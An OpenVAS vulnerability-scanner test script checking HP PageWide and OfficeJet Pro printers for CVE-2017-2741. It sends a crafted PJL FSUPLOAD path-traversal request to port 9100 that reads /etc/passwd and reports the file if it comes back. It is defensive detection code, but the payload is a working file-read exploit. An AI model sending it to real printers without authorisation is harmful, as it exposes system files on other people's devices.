##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_printer_rce_vuln.nasl 7901 2017-11-24 10:49:33Z jschulte $
#
# HP Printers Arbitrary Code Execution Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106920");
  script_version("$Revision: 7901 $");
  script_tag(name: "last_modification", value: "$Date: 2017-11-24 11:49:33 +0100 (Fri, 24 Nov 2017) $");
  script_tag(name: "creation_date", value: "2017-07-05 09:03:32 +0700 (Wed, 05 Jul 2017)");
  script_tag(name: "cvss_base", value: "10.0");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-2741");

  script_tag(name: "qod_type", value: "remote_vul");

  script_tag(name: "solution_type", value: "VendorFix");

  script_name("HP Printers Arbitrary Code Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/PJL", 9100 );

  script_tag(name: "summary", value: "A potential security vulnerability has been identified with certain HP
printers. This vulnerability could potentially be exploited to execute arbitrary code.");

  script_tag(name: "vuldetect", value: "Sends a crafted PJL request and checks the response.");

  script_tag(name: "affected", value: "HP PageWide Printers and HP OfficeJet Pro Printers.");

  script_tag(name: "solution", value: "HP has provided firmware updates for impacted printers. See the
referenced advisory for further details.");

  script_xref(name: "URL", value: "https://support.hp.com/lt-en/document/c05462914");

  exit(0);
}

include("misc_func.inc");

port = get_kb_item("Services/PJL");
if (!port)
  port = 9100;

if (!get_port_state(port))
  exit(0);

if (hexstr(get_unknown_banner(port: port, dontfetch: TRUE)) == "aeaeaeaeae") {
  soc = open_sock_tcp(port);
  if (!soc)
    exit(0);

  send(socket: soc, data: '\x1b%-12345X@PJL FSUPLOAD NAME="../../etc/passwd" OFFSET=0 SIZE=648\r\n\x1b%-12345X\r\n');
  res = recv(socket: soc, length: 1024);

  if (res =~ "root:.*:0:[01]:") {
    report = "It was possible to obtain the /etc/passwd file.\n\n" + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
